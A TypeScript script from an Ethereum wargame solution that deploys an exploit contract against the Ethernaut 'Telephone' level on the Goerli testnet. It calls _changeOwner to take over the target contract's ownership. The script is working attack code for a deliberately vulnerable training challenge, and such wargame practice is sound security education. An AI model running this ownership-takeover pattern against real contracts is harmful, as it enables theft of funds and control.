import TelephoneJson from '../../../artifacts/contracts/level4/Telephone.sol/Telephone.json'
import TelephoneExploitJson from '../../../artifacts/contracts/level4/TelephoneExploit.sol/TelephoneExploit.json'
const ethers = require('ethers');
require ('dotenv').config ()

const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const telephoneContractAddress: string = '0xC5E874e3a1BB0d37910B69f24016EB5D5F83eA98';


async function main(){
  console.log(`Ethernaut level 4 - script made by JoVi\n ------ `);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);
  const telephoneContract = new ethers.Contract(telephoneContractAddress, TelephoneJson.abi, signer);
  const telephoneExploitContractInterface = new ethers.ContractFactory(TelephoneExploitJson.abi, TelephoneExploitJson.bytecode, signer);

  console.log(`Deploying exploit contract\n ------`);
  const telephoneExploitContract = await telephoneExploitContractInterface.deploy(telephoneContractAddress);
  console.log(`Succesfully deployed at ${telephoneExploitContract.address}\n ------`);

  console.log(`Attempting to claim Telephone's contract ownership\n ------`);

  const exploitTx = await telephoneExploitContract._changeOwner();
  const exploitTxReceipt = await exploitTx.wait();

  console.log(`Ownership claim succesfull. Ggs.\n ------`);

  
}


// Execute
main();